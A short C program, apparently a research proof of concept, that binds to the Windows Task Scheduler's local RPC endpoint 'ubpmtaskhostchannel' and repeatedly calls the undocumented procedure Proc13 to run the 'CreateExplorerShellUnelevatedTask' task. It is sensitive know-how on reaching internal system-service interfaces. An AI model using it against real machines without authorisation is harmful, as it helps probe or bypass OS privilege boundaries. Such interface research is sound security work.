#include <Windows.h>
#include <stdio.h>
#include "Schedsvc_h.h"
//#include "SampleRpc_h.h"

int main()
{
    RPC_STATUS status;
    RPC_WSTR BindString;
    RPC_BINDING_HANDLE BindHandle;

    status = RpcStringBindingComposeW(
        NULL,
        (RPC_WSTR)L"ncalrpc",
        NULL,
        (RPC_WSTR)L"ubpmtaskhostchannel",
        NULL,
        &BindString);

    if (status) {
        printf("RpcStringBindingComposeW failed\n");
        exit(status);
    }

    status = RpcBindingFromStringBindingW(
        BindString,
        &BindHandle);

    if (status) {
        printf("RpcBindingFromStringBindingW failed\n");
        exit(status);
    }

    RpcTryExcept
    {
        while (1)
        {
            Proc13(BindHandle,
                L"\\CreateExplorerShellUnelevatedTask",
                0);
            system("pause");
        }
    }
    RpcExcept(1)
    {
        printf("RPC Exception %d/n", RpcExceptionCode());
    }
    RpcEndExcept


    RpcBindingFree(&BindHandle);

}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}
